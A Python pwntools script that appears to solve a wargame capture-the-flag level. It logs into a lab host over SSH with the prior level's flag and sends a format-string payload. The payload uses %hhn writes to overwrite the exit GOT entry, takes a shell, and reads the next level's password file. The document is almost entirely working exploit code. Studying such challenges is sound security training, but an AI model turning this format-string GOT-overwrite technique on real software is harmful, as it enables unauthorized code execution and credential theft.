#!/usr/bin/python3

from pwn import *

host = '10.11.248.120'
port = 4242
user = 'level5'
password = open("../level4/flag", "rb").read()

with ssh(user=user, host=host, port=port, password=password) as s:

    p = s.process(["./level5"])

    def ssh_send(line):
        if type(line) == str:
            line = line.encode("utf-8")
        elif type(line) != bytes:
            print("[x] Wrong data format !")
            raise ValueError
        print(f"[x] Sending: {line!r}")
        p.sendline(line)

    def ssh_recv(timeout = 1.0) -> str:
        data = p.recv(timeout=timeout)
        text = data.decode(errors='ignore')
        print(f"[x] Received: {text!r}")
        return text

    def wait_for_shell():
        while True:
            output = ssh_recv()
            if output == "$ ":
                break
    
    try:
        
        FUNC_O   = 0x080484a4
        GOT_EXIT = 0x08049838

        payload = b""
        payload += p32(GOT_EXIT) + b'    '
        payload += p32(GOT_EXIT + 1) + b'    '
        payload += p32(GOT_EXIT + 2) + b'    '
        payload += p32(GOT_EXIT + 3) + b'    '
        payload += b"%8x%8x%116x%hhn%224x%hhn%128x%hhn%260x%hhn"
        ssh_send(payload)

        wait_for_shell()
        ssh_send("cat /home/user/level6/.pass")
        flag = ssh_recv().split('\n')[0]
    
    except ValueError:
        exit(1)

    print(f"\nlevel6 password: {flag}\n")

    flagfile = open("flag", "wb")
    flagfile.write(flag.encode("utf-8"))

    s.close()

